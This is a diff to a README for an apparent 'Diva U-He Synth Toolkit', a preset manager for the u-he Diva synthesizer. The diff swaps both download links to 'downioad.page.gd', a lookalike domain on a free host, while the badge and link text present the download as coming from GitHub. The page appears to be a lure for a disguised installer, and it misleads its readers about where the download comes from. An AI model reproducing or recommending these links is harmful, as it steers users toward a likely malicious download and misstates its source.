@@ -2,7 +2,7 @@
 
 Discover the ultimate utility for owners of the acclaimed Diva synthesizer by u-he. This toolkit is designed to enhance your workflow by providing a centralized hub for browsing, installing, and organizing your vast library of Diva presets and soundbanks, ensuring you get the most out of your instrument in 2026 and beyond.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -48,7 +48,7 @@ A: It is highly recommended to close your Digital Audio Workstation (e.g., FL St
 
 For the latest version of the Diva U-He Synth Toolkit, please use the link below.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 *© 2026 Diva U-He Synth Toolkit Project. This is an independent utility and is not affiliated with or endorsed by u-he.*
